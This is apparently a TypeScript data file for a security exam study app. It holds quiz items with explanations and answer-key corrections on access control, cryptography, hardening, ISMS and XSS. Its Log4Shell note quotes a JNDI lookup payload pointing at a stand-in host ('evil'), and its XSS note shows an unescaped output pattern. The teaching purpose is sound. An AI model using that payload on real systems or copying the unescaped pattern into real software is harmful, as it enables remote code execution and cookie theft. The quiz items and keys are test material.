import type { QuestionNotes, RawQuestion } from '../../types';

/** The XSS question was merged into security-24 in the source file; it is restored here as its own question. */
export const securityExtra: RawQuestion[] = [
  {
    id: 'security-33',
    stem: 'What is the type of security weakness described below?',
    context: [
      { type: 'li', text: 'Malicious scripts are inserted into a web page to be executed by a user’s PC.' },
      { type: 'li', text: 'When an unverified external input is used to create a dynamic web page, it launches malicious behavior with the access privilege of the person browsing the page.' },
      { type: 'li', text: 'It leads to attacks such as leaks in browser cookies.' },
      { type: 'img', src: 'img/security/security-24-1.webp' },
    ],
    options: [
      { text: 'Web shell', img: null },
      { text: 'SQL injection', img: null },
      { text: 'Cross-site script', img: null },
      { text: 'Memory Buffer Overflow', img: null },
    ],
    keyIndex: -1,
  },
];

export const securityNotes: Record<string, QuestionNotes> = {
  'security-01': {
    t: 'sec-access',
    e: '**Access control** decides *who* can reach *what*, *how* and *when*: identify sensitive data and who may see it, authenticate users, and define access methods and times. **Duplexing** (redundant systems for failover) is about **availability**, not access control.',
    w: [
      'Correct. Redundancy for failures is availability, not access control.',
      'Needed: you must know who the user is.',
      'Needed: define how and when access is allowed.',
      'Needed: decide who may see critical information.',
    ],
    r: 'Access control = who, what, how, when.',
  },
  'security-02': {
    t: 'sec-system',
    e: 'Linux hardening basics: remove unused accounts (`userdel`), set permissions with `chmod`, protect system files such as `/etc/profile` so only root can write them, and use TCP Wrappers. `/etc/hosts.allow` and `/etc/hosts.deny` list **hosts / IP addresses** that may or may not connect, not **users**.',
    w: [
      'Correct practice.',
      'Marked as the answer, but restricting write access on /etc/profile to root is a correct practice.',
      'Correct practice.',
      'hosts.allow / hosts.deny control hosts (IPs), not user accounts.',
    ],
    k: {
      likely: 3,
      note: 'Removing write permission on `/etc/profile` from everyone except root is a **standard, good** hardening step, since that file runs for every user at login, so it is not the answer. Option 4 is the wrong practice, so it is the answer: `/etc/hosts.allow` and `/etc/hosts.deny` (TCP Wrappers) list **hosts and IP addresses**, not users.',
    },
    r: 'hosts.allow / hosts.deny = which machines may connect.',
  },
  'security-03': {
    t: 'sec-manage',
    e: '**ISMS** (Korea’s Information Security Management System certification) checks whether a company manages security systematically. It is valid for **3 years**, with yearly follow-up audits. Certification proves good management, but it can never **guarantee** a company will never be breached.',
    w: [
      'Not only for-profit companies are covered.',
      'The true statement: certification is not a 100% guarantee.',
      'Marked as the answer, but ISMS certification is valid for 3 years, not 5.',
      'Scope focuses on information and communication services and their supporting assets.',
    ],
    k: {
      likely: 1,
      note: 'Korean ISMS certification is valid for **3 years** (with annual surveillance audits), so option 3 is false. Option 2 is the reliable true statement: being certified does not mean a company is 100% safe from incidents.',
    },
    r: 'ISMS: valid 3 years, yearly check-ups, no 100% guarantee.',
  },
  'security-04': {
    t: 'sec-manage',
    e: '**ISMS-P** combines two certifications: **ISMS** (information security management) and **personal information** protection. It examines both security policies and processes **and** how personal data is collected, used and destroyed.',
    w: [
      'Covers both information security and personal information, exactly as described.',
      'ITSM is IT service management (e.g. ITIL), not a security certification.',
      'PIMS was the older personal-information-only certification, merged into ISMS-P.',
      'Marked as the answer, but PIPL covers personal information only, not the security management part.',
    ],
    k: {
      likely: 0,
      note: 'The description has **two** parts: information protection management **and** personal information management. That combination is exactly what **ISMS-P** (ISMS + Personal information) certifies. PIPL only rates personal information protection.',
    },
    r: 'ISMS-P = ISMS + Personal information.',
  },
  'security-05': {
    t: 'sec-crypto',
    e: '**Symmetric** ciphers (AES, SEED, ARIA) are fast and used for bulk data. **Asymmetric** ciphers (RSA, ECC) are slow and used for small things like encrypting keys and signatures. **Hashes** (SHA-256) check integrity. Using ECC to encrypt massive data quickly is the wrong tool.',
    w: [
      'Right use: RSA protects the (small) encryption key.',
      'Correct. ECC is asymmetric and slow, so not for bulk data.',
      'Right use: SEED is a fast symmetric block cipher.',
      'Right use: SHA-256 checks integrity.',
    ],
    r: 'Bulk data = symmetric. Keys and signatures = asymmetric. Integrity = hash.',
  },
  'security-06': {
    t: 'sec-system',
    e: 'Linux permission commands: `chmod` changes permissions, `chown` changes the **owner**, `umask` sets the **default permissions for newly created files**. Here new `.txt` files are created every month and then fixed with chmod afterwards. The improvement is to make new files restricted **from the moment they are created**, which is what `umask` does.',
    w: [
      'cat displays file contents.',
      'Marked as the answer, but the files are already owned by root, so changing the owner fixes nothing.',
      'touch creates an empty file or updates its timestamp.',
      'umask makes every newly created file restricted automatically.',
    ],
    k: {
      likely: 3,
      note: 'The listing shows the files are **already owned by root**, so `chown` would change nothing. The weakness is that each month’s new file starts with default permissions until someone runs chmod. `umask` sets the default permission mask, so new files are created restricted from the start. That is option 4.',
    },
    r: 'chmod = permissions now. chown = owner. umask = defaults for new files.',
  },
  'security-07': {
    t: 'sec-system',
    e: 'Original **802.11** Wi-Fi used **WEP**, which is badly broken. **802.11i** (WPA2) fixed it: **802.1X** for authentication, a **4-way handshake** for keys, and **CCMP/AES** for encryption. This question is a copy of security-22 that dropped the "i".',
    w: [
      '802.1X authentication (from 802.11i).',
      '4-way handshake (from 802.11i).',
      'Authentication and encryption are separated in 802.11i.',
      'Your key’s answer. Modern secure Wi-Fi does not use WEP.',
    ],
    r: 'WEP = broken. 802.11i / WPA2 = 802.1X + 4-way handshake + AES.',
  },
  'security-08': {
    t: 'sec-system',
    e: 'Read the form: an FTP **client** on 124.111.37.30 (source) connects to an FTP **server** on 119.31.244.248 (destination) on ports **20 and 21**. The firewall must allow traffic **from the source IP to the destination IP on those ports**. Saying to open inbound ports **to the source IP** gets the direction backwards.',
    w: [
      'True: the client is on the source IP.',
      'True: the server is on the destination IP.',
      'True: FTP uses ports 20 (data) and 21 (control).',
      'Correct. Wrong direction: traffic goes from the source to the server’s ports.',
    ],
    r: 'Source = who starts the connection. Destination = who listens on the port.',
  },
  'security-09': {
    t: 'sec-system',
    e: '**SSL/TLS** encrypts traffic between client and server. **HTTPS** is HTTP over SSL/TLS. The server needs an **SSL certificate**, and the **handshake** authenticates the parties and agrees on keys. SSL sits between the transport layer and the application layer. It does **not** run in the **network** layer (that is IPsec).',
    w: [
      'Marked as the answer, but HTTPS really is HTTP + SSL/TLS.',
      'True: the server needs a certificate.',
      'This is the false statement: SSL is not a network-layer protocol.',
      'True: the handshake authenticates the parties.',
    ],
    k: {
      likely: 2,
      note: '"HTTPS is SSL applied to HTTP" is the textbook definition of HTTPS, so it is **true** and not the answer. Option 3 is the false statement, so it is the answer: SSL/TLS works above TCP (between transport and application layers). The network layer security protocol is **IPsec**.',
    },
    r: 'HTTPS = HTTP + SSL/TLS. Network-layer security = IPsec.',
  },
  'security-10': {
    t: 'sec-app',
    e: 'Cloud runs many customers’ virtual machines on shared hardware through a **hypervisor**. If the hypervisor or underlying hardware has a flaw, an attacker can affect **every** VM on it. That is a **virtualization vulnerability**.',
    w: [
      'Hypervisor and shared-hardware weaknesses spreading to everything is a virtualization vulnerability.',
      'Poor protection of encryption keys.',
      'Marked as the answer, but insecure APIs are about badly protected service interfaces.',
      'Weak login and permission controls.',
    ],
    k: {
      likely: 0,
      note: 'Both bullet points are about the **foundation** of the cloud: weaknesses in the underlying technology and hardware, and **hypervisor hacking** affecting all guest operating systems. That is the definition of **virtualization vulnerabilities**. Insecure API is a different threat (poorly secured interfaces customers use to manage cloud services).',
    },
    r: 'Hypervisor in the question? Virtualization vulnerability.',
  },
  'security-11': {
    t: 'sec-app',
    e: '**Log4Shell** (CVE-2021-44228) is a flaw in the Java logging library Log4j. If an attacker gets a string like `${jndi:ldap://evil/x}` logged, Log4j performs a **JNDI lookup** and loads remote code without checking it. It scored a maximum **CVSS 10 (Critical)**, enabled malware and botnets, and the fix is to upgrade to a patched version **that matches your Java version**.',
    w: [
      'True: rated Critical (CVSS 10).',
      'Your key’s answer, although this matches official upgrade guidance.',
      'True: attackers used it for malware and DDoS botnets.',
      'Broadly true: the JNDI lookup result is trusted without validation.',
    ],
    k: {
      likely: -1,
      note: 'Official guidance (Apache and national CERTs) was to upgrade **according to your Java version**: for example 2.17.1 for Java 8, 2.12.4 for Java 7. So option 2 reads as a true statement. The original question may have said something different (like "regardless of the Java version"). Remember the key facts instead: JNDI lookup, CVSS 10, remote code execution, upgrade per Java version.',
    },
    r: 'Log4Shell = ${jndi:...} → remote code execution, CVSS 10.',
  },
  'security-12': {
    t: 'sec-system',
    e: 'IDS detection methods. **Misuse / signature / rule / pattern based**: matches known attack signatures, so it misses new attacks. **Anomaly / behavior based**: learns normal behavior with statistics or machine learning and flags anything unusual, so it can catch **unknown** attacks.',
    w: [
      'Rule based matches known rules, so it cannot detect unknown attacks.',
      'Pattern based matches known patterns.',
      'Correct. Statistics / ML on behavior can catch unknown attacks.',
      'Signature based matches known signatures.',
    ],
    r: 'Known attacks = signature. Unknown attacks = behavior (anomaly).',
  },
  'security-13': {
    t: 'sec-access',
    e: 'Access control models. **DAC (Discretionary)**: the owner grants rights to **individual users**, often shown as an **access control matrix** (users × objects). **MAC (Mandatory)**: the system enforces security labels and clearances. **RBAC (Role-Based)**: rights belong to **roles**, and users get roles.',
    w: [
      'A matrix of named users and their rights per object is the classic DAC picture.',
      'MAC uses labels and clearance levels, not per-user entries.',
      'NDAC is a broader term (RBAC is one type of it).',
      'Marked as the answer, but no roles appear, only individual users.',
    ],
    k: {
      likely: 0,
      note: 'The table lists **individual users** (Kim, Lee, Park, Choi) and gives each one specific rights per database. There are no roles like "Manager" or "Accountant". A per-user **access control matrix** is the textbook illustration of **DAC**. For RBAC you would expect roles in the rows.',
    },
    r: 'Users in the rows = DAC. Roles in the rows = RBAC. Labels = MAC.',
  },
  'security-14': {
    t: 'sec-crypto',
    e: 'Good key management: generate keys with a **secure random number generator**, **never store keys in plain text**, rotate them regularly, and split duties between the DBA and the security manager with minimum privileges.',
    w: [
      'Correct practice.',
      'Correct. Wrong practice: keys must never be stored in plain text.',
      'Correct practice: regular key rotation.',
      'Correct practice: separation of duties.',
    ],
    r: 'Plain-text key = no encryption at all.',
  },
  'security-15': {
    t: 'sec-system',
    e: 'Each permission digit is read (4) + write (2) + execute (1). Owner topcit: read + write = **6**. Group: read = **4**. Others: read = **4**. So the command is `chmod 644 secret.txt` (rw-r--r--).',
    w: [
      '022 gives almost no permissions (----w--w-).',
      'rw-r--r--, exactly the requirement (the filename is missing a dot, a typo).',
      'Marked as the answer, but 755 gives everyone execute, which the table forbids.',
      '777 lets everyone do everything, which is the original problem.',
    ],
    k: {
      likely: 1,
      note: 'The table says **no one** may execute the file. 755 = rwxr-xr-x gives execute to owner, group and others. The requirement (owner read+write, group read, others read) is rw-r--r-- = **644**, which is option 2 (the filename has a typo, "secret txt").',
    },
    r: 'r = 4, w = 2, x = 1. rw-r--r-- = 644.',
  },
  'security-16': {
    t: 'sec-manage',
    e: 'The **CIA triad**: **Confidentiality** (only authorized people see data), **Integrity** (data is not altered), **Availability** (service stays up when needed). A backup firewall that takes over when one fails keeps the service **available**.',
    w: [
      'Correct. Failover keeps the service available.',
      'Confidentiality is about secrecy.',
      'Integrity is about data not being altered.',
      'Not one of the three CIA goals.',
    ],
    r: 'Redundancy / failover = Availability.',
  },
  'security-17': {
    t: 'sec-manage',
    e: '**De-identification** removes or masks personal identifiers. **Re-identification** is the reverse: identifying a person again by combining or analyzing de-identified data with other information. It is the main risk when pseudonymized data is shared.',
    w: [
      'Generalization is a de-identification technique (e.g. age 34 → 30s).',
      'Obfuscation hides data, it does not restore identity.',
      'Correct. Identifying a person again from de-identified data.',
      'Standardization means making data consistent.',
    ],
    r: 'De-identify = hide who. Re-identify = find who again.',
  },
  'security-18': {
    t: 'sec-crypto',
    e: '**Public-key (asymmetric) encryption** uses **two different keys** (public and private). It is **slow** but solves key exchange: you can communicate securely with a stranger using their public key. **Symmetric** encryption uses **one shared key**, is fast, and needs the key to be shared in advance.',
    w: [
      'Block encryption is a symmetric method.',
      'Two different keys, slow, good for strangers: public-key encryption.',
      'Stream encryption is a symmetric method.',
      'Marked as the answer, but symmetric encryption uses the same key for both and is fast.',
    ],
    k: {
      likely: 1,
      note: 'Every clue points to **public-key** encryption: different keys for encryption and decryption, relatively slow, suited to people you have not met (you just use their public key). Symmetric encryption is the opposite: one shared key and fast.',
    },
    r: 'Two keys + slow + strangers = public key. One key + fast = symmetric.',
  },
  'security-19': {
    t: 'sec-crypto',
    e: 'A **digital signature** proves **who** sent a message (authentication), that it was **not changed** (integrity), and that the sender **cannot deny** sending it (non-repudiation). It does **not** keep the message secret, because confidentiality needs separate encryption.',
    w: [
      'Correct. A signature does not hide the content.',
      'Provided: the hash shows any change.',
      'Provided: the signature proves the sender.',
      'Provided: only the sender’s private key could sign.',
    ],
    r: 'Signature = Integrity, Authentication, Non-repudiation. NOT confidentiality.',
  },
  'security-20': {
    t: 'sec-access',
    e: '**OAuth** lets an app use an existing account at Google or Facebook ("Sign in with Google") without creating a new password. The provider confirms the user and gives the app a token with limited permissions.',
    w: [
      'Correct. Log in using an existing Google / Facebook account.',
      'OTP is a one-time code, usually a second factor.',
      'PKI manages certificates and public keys.',
      'SSL encrypts the connection.',
    ],
    r: '"Sign in with Google" = OAuth.',
  },
  'security-21': {
    t: 'sec-system',
    e: '**Spoofing** means **faking an identity**: a fake MAC address, a fake IP address, a fake sender email. The attacker pretends to be someone trusted.',
    w: [
      'Smishing is phishing by SMS.',
      'Sniffing is eavesdropping on network traffic.',
      'Snooping is generally prying into data.',
      'Correct. Forging MAC, IP or email identity.',
    ],
    r: 'Spoof = fake ID.',
  },
  'security-22': {
    t: 'sec-system',
    e: '**802.11i** (the basis of WPA2) replaced broken WEP. It uses **802.1X** for user authentication, a **4-way handshake** to set up keys, separates authentication from encryption, and encrypts with **CCMP (AES)**.',
    w: [
      'True: 802.1X.',
      'True: 4-way handshake.',
      'True: authentication and encryption are separated.',
      'Correct. False: 802.11i uses CCMP/AES, not WEP.',
    ],
    r: '802.11i killed WEP.',
  },
  'security-23': {
    t: 'sec-crypto',
    e: 'Matching hash and signature prove that the contract **was not altered** (integrity) and that **Lee signed it** with his private key (authentication and non-repudiation), using a public/private key pair. A signature does **not** encrypt the document, so it says nothing about whether someone else read it on the way.',
    w: [
      'Can be inferred: the hashes match, so it was not altered.',
      'Marked as the answer, but this can be inferred: only Lee’s private key makes a signature his public key verifies.',
      'Cannot be inferred: a signature gives no confidentiality.',
      'Can be inferred: digital signatures use a key pair.',
    ],
    k: {
      likely: 2,
      note: 'Proving the author **is** what a signature does (authentication / non-repudiation), so option 2 can be inferred. What a signature **cannot** tell you is whether the document was **leaked**: signing does not encrypt, so confidentiality is not guaranteed. That is option 3.',
    },
    r: 'Signature tells you who and unchanged. It never tells you secret.',
  },
  'security-24': {
    t: 'sec-system',
    e: 'Windows hardening: delete or disable unused accounts like Guest, block shared folders and remote registry access, and stop unneeded services (Telnet, anonymous FTP, SNMP). **iptables** is a **Linux** firewall command and does not exist on Windows.',
    w: [
      'Correct practice.',
      'Correct practice.',
      'Correct. iptables is a Linux tool, not Windows.',
      'Correct practice.',
    ],
    fix: { dropContext: [0, 1, 2, 3, 4, 5, 6, 7, 8] },
    r: 'iptables = Linux. Windows Firewall / netsh = Windows.',
  },
  'security-25': {
    t: 'sec-crypto',
    e: '**Quantum cryptography** (quantum key distribution) uses physics: a quantum state cannot be copied (**no-cloning**) and measuring it disturbs it. If anyone eavesdrops on the key, the change is detected. It produces one-time keys that are considered the most secure known method.',
    w: [
      'Hash-based cryptography uses hash functions (a post-quantum signature method).',
      'Correct. Superposition, unclonable states, one-time keys.',
      'Steganography hides data inside other data (like an image).',
      'A stream cipher encrypts bit by bit with a keystream.',
    ],
    m: { answer: 1, note: 'Your reviewer has no answer marked. "Superposition" and "unclonable" are quantum properties, so the answer is **Quantum Cryptography**.' },
    r: 'Superposition + unclonable = quantum cryptography.',
  },
  'security-26': {
    t: 'sec-access',
    e: 'Permissions are attached to **job functions** (developer, user, DBA), and people get the function they need. When staff move around, you just change their role. That is **RBAC (Role-Based Access Control)**.',
    w: [
      'DAC: the owner grants rights to individual users.',
      'Not a standard model name.',
      'MAC: the system enforces labels and clearances.',
      'Correct. Rights belong to roles, people get roles.',
    ],
    m: { answer: 3, note: 'Your reviewer has no answer marked. Job functions holding the minimum rights, which are easy to reassign when staff change, are the definition of **RBAC**.' },
    r: 'Job function = role = RBAC.',
  },
  'security-27': {
    t: 'sec-app',
    e: 'Secure mobile apps only do what their service needs, encrypt important data at rest and in transit, and use **obfuscation** against decompiling. They should **detect rooting / jailbreaking and refuse to run**, because a rooted device removes the operating system’s protections.',
    w: [
      'Correct practice.',
      'Correct. Wrong practice: apps should block rooted or jailbroken devices.',
      'Correct practice.',
      'Correct practice.',
    ],
    m: { answer: 1, note: 'Your reviewer has no answer marked. Running normally on rooted or jailbroken devices is a security weakness, so option 2 is the incorrect statement.' },
    r: 'Rooted / jailbroken device = app should refuse to run.',
  },
  'security-28': {
    t: 'sec-crypto',
    e: 'A **block cipher** (DES, AES) encrypts fixed-size blocks, and needs a **mode of operation** (ECB, CBC, CTR...) when data is longer than one block. A **stream cipher** encrypts bit by bit and is generally **faster** and simpler. So "block is faster than stream" is backwards.',
    w: [
      'True: DES and AES are block ciphers.',
      'Correct. False: stream ciphers are generally faster.',
      'True: fixed-length blocks.',
      'True: modes of operation handle longer data.',
    ],
    m: { answer: 1, note: 'Your reviewer has no answer marked. Stream ciphers are usually faster than block ciphers, so option 2 is the false statement.' },
    r: 'Block = chunks + modes. Stream = bit by bit, faster.',
  },
  'security-29': {
    t: 'sec-crypto',
    e: 'Signing: the **sender** encrypts the message digest (hash) with the **sender’s private key**. Verifying: the receiver decrypts it with the **sender’s public key** and compares it with their own hash. (For confidentiality it is the other way around: encrypt with the receiver’s public key.)',
    w: [
      'Backwards: public key can’t make a signature only the sender could make.',
      'Correct. Sign with the sender’s private key, verify with the sender’s public key.',
      'Receiver keys are used for confidentiality, not signatures.',
      'The receiver’s private key is never used to sign.',
    ],
    m: { answer: 1, note: 'Your reviewer has no answer marked. A digital signature is created with the **sender’s private key** (a) and checked with the **sender’s public key** (b).' },
    r: 'Sign with MY private key. You verify with MY public key.',
  },
  'security-30': {
    t: 'sec-app',
    e: 'In the **Secure SDLC**, each phase has security work. Requirements: define security requirements. **Design**: **threat modeling** and changing the design to remove threats. Implementation: secure coding and code review. Testing: dynamic analysis and penetration testing.',
    w: [
      'Correct. Threat modeling and design changes happen in design.',
      'Maintenance handles patches after release.',
      'Implementation is secure coding and code review.',
      'Requirements analysis identifies security requirements.',
    ],
    m: { answer: 0, note: 'Your reviewer has no answer marked. Threat modeling and modifying the system structure to remove threats are **design** phase activities.' },
    r: 'Threat modeling = design phase.',
  },
  'security-31': {
    t: 'sec-crypto',
    e: 'Passwords must be stored with a **one-way hash** (with a salt), never with **two-way (reversible) encryption**. If the key leaks, reversible encryption exposes every password. AES for identifiers, encrypting data in the DMZ, and API encryption between servers are all fine.',
    w: [
      'Correct practice: AES for unique identifiers.',
      'Correct. Wrong practice: passwords need a one-way hash, not reversible encryption.',
      'Correct practice.',
      'Correct practice.',
    ],
    m: { answer: 1, note: 'Your reviewer has no answer marked. Passwords should be **hashed one-way** (e.g. SHA-256 with salt, or bcrypt), so "encrypted with a bi-directional algorithm" is the incorrect method.' },
    r: 'Passwords: hash, never encrypt.',
  },
  'security-32': {
    t: 'sec-app',
    e: 'Secure SDLC activities by phase. Requirements: identify security requirements. Design: threat modeling. **Implementation**: secure coding plus **source code review / static analysis**. Testing: **dynamic analysis** and **penetration testing**.',
    w: [
      'Requirements phase.',
      'Design phase.',
      'Correct. Source code review happens during implementation.',
      'Testing phase.',
    ],
    m: { answer: 2, note: 'Your reviewer has no answer marked. Reviewing or diagnosing source code security is the **implementation** phase activity.' },
    r: 'Code review = implementation. Pen test = testing.',
  },
  'security-33': {
    t: 'sec-app',
    e: '**Cross-site scripting (XSS)**: the site takes user input and puts it into a web page without checking it (`<%=user_input%>` in the example). An attacker inserts a script that then runs in **other users’ browsers**, for example to steal their cookies. Fix: validate input and escape output.',
    w: [
      'A web shell is a malicious script uploaded to the server.',
      'SQL injection attacks the database through queries.',
      'Correct. Malicious script runs in the visitor’s browser.',
      'Buffer overflow writes past memory limits.',
    ],
    m: { answer: 2, note: 'Your reviewer has no answer marked for this one. A script injected into a web page that runs in the user’s browser and steals cookies is **cross-site scripting (XSS)**.' },
    r: 'Script runs in the victim’s browser = XSS. Query runs in the database = SQL injection.',
  },
};
